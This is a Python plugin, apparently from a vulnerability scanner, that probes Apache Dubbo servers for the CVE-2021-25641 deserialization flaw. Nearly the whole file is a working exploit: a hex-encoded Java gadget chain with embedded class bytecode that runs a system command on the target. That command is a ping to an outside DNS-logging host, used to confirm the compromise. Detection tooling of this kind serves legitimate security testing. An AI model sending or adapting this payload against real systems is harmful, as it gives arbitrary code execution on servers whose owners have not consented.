#!/usr/bin/env python
# coding=utf-8

from lib.poc.dummy import *


async def do_scan(ip, port, service, is_http, task_msg):
    try:
        if not conf.dnslog_enabled:
            return
        if service.find("dubbo") < 0:
            return
        
        details = u'Apache Dubbo 因支持Hessian2序列化框架，' \
                  u'攻击者利用特制的数据包绕过Hessian2黑名单限制，实现任意代码执行。' \
                  u'执行命令为 ping -c 1 ip, 受影响版本为 < 2.7.10'
        anchor = random_str(8)
        domain = dns_monitor(ip, port).add_checker(anchor + '.dubbo',
                                                   alert_group='Dubbo CVE-2021-25641 RCE', details=details)

        reader, writer = await asyncio.open_connection(ip, port)
        payload = "DABBC800000000000000000000000CEA322E302EB26F72672E6170616368652E647562626F2E64656D6F2E44656D6F536572766963E5302E302EB073617948656C6CEF4C6A6176612F6C616E672F537472696E67BB23010201006F72672E737072696E676672616D65776F726B2E616F702E7461726765742E486F74537761707061626C65546172676574536F757263E501ACED0005737200376F72672E737072696E676672616D65776F726B2E616F702E7461726765742E486F74537761707061626C65546172676574536F75726365680DFEE4A741A3530200014C00067461726765747400124C6A6176612F6C616E672F4F626A6563743B78707372001F636F6D2E616C69626162612E666173746A736F6E2E4A534F4E4F626A65637400000000000000010200014C00036D617074000F4C6A6176612F7574696C2F4D61703B7870737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017400046F6F70737372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D657400124C6A6176612F6C616E672F537472696E673B4C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000002757200025B42ACF317F8060854E0020000787000000747CAFEBABE0000003400470A0003002207004507002507002601001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C756505AD2093F391DDEF3E0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472616E736C65745061796C6F616401000C496E6E6572436C61737365730100304C447562626F50726F746F636F6C4578706C6F69742F5574696C7324537475625472616E736C65745061796C6F61643B0100097472616E73666F726D010072284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B5B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B2956010008646F63756D656E7401002D4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B01000868616E646C6572730100425B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A457863657074696F6E730700270100A6284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B29560100086974657261746F720100354C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B01000768616E646C65720100414C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A536F7572636546696C6501000A5574696C732E6A6176610C000A000B07002801002E447562626F50726F746F636F6C4578706C6F69742F5574696C7324537475625472616E736C65745061796C6F6164010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740100146A6176612F696F2F53657269616C697A61626C65010039636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F5472616E736C6574457863657074696F6E01001A447562626F50726F746F636F6C4578706C6F69742F5574696C730100083C636C696E69743E0100106A6176612F6C616E672F53797374656D07002A0100036F75740100154C6A6176612F696F2F5072696E7453747265616D3B0C002C002D09002B002E01000777686F6F7073210800300100136A6176612F696F2F5072696E7453747265616D0700320100077072696E746C6E010015284C6A6176612F6C616E672F537472696E673B29560C003400350A003300360100116A6176612F6C616E672F52756E74696D6507003801000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B0C003A003B0A0039003C01002A70696E67202D6320312078787878787878782E647562626F2E6C75636B792E66616368756E2E6E65742008003E01000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0C004000410A0039004201000D537461636B4D61705461626C6501001E79736F73657269616C2F50776E65723139323235373333383138313230340100204C79736F73657269616C2F50776E65723139323235373333383138313230343B002100020003000100040001001A000500060001000700000002000800040001000A000B0001000C0000002F00010001000000052AB70001B100000002000D00000006000100000032000E0000000C000100000005000F004600000001001300140002000C0000003F0000000300000001B100000002000D00000006000100000037000E00000020000300000001000F0046000000000001001500160001000000010017001800020019000000040001001A00010013001B0002000C000000490000000400000001B100000002000D0000000600010000003B000E0000002A000400000001000F004600000000000100150016000100000001001C001D000200000001001E001F00030019000000040001001A00080029000B0001000C0000002C0003000200000017A70003014CB2002F1231B60037B8003D123FB6004357B1000000010044000000030001030002002000000002002100110000000A000100020023001000097571007E0011000001C3CAFEBABE00000034001B0A0003001507001707001807001901001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C75650571E669EE3C6D47180100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010003466F6F01000C496E6E6572436C61737365730100204C447562626F50726F746F636F6C4578706C6F69742F5574696C7324466F6F3B01000A536F7572636546696C6501000A5574696C732E6A6176610C000A000B07001A01001E447562626F50726F746F636F6C4578706C6F69742F5574696C7324466F6F0100106A6176612F6C616E672F4F626A6563740100146A6176612F696F2F53657269616C697A61626C6501001A447562626F50726F746F636F6C4578706C6F69742F5574696C73002100020003000100040001001A000500060001000700000002000800010001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000003F000E0000000C000100000005000F001200000002001300000002001400110000000A000100020016001000097074000450776E727077010078780100030100017371007E000073720031636F6D2E73756E2E6F72672E6170616368652E78706174682E696E7465726E616C2E6F626A656374732E58537472696E671C0A273B4816C5FD02000078720031636F6D2E73756E2E6F72672E6170616368652E78706174682E696E7465726E616C2E6F626A656374732E584F626A656374F4981209BB7BB6190200014C00056D5F6F626A71007E00017872002C636F6D2E73756E2E6F72672E6170616368652E78706174682E696E7465726E616C2E45787072657373696F6E07D9A61C8DACACD60200014C00086D5F706172656E747400324C636F6D2F73756E2F6F72672F6170616368652F78706174682F696E7465726E616C2F45787072657373696F6E4E6F64653B7870707400044845594F01000400"
        p = payload.replace("7878787878787878", "".join([hex(ord(i)) for i in anchor]).replace("0x", ""))

        writer.write(bytes.fromhex(p))
        await writer.drain()
        data = await asyncio.wait_for(reader.read(1000), 6)
        writer.close()
        try:
            await writer.wait_closed()  # application data after close notify (_ssl.c:2730)
        except Exception as e:
            pass

    except Exception as e:
        debug(e)


if __name__ == "__main__":
    scan = do_scan('easypen-test.lijiejie.com', 31259, 'dubbo', True, task_msg={})
    run_plugin_test(scan)
